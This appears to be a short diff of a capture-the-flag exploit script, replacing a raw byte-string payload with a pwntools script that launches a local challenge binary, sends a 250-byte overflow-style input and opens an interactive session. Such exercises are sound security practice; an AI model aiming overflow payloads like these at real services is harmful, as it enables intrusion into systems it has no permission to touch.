@@ -1,3 +1,9 @@
-from sys import stdout
+import pwn
 
-stdout.buffer.write(b'fffff\x00' + b'\x5f' * 250)
+p = pwn.process("./static/oppenheimers-research")
+# host = "localhost"
+# port = 4444
+# p = remote(host, port)
+
+p.sendline(b'A' * 250)
+p.interactive()
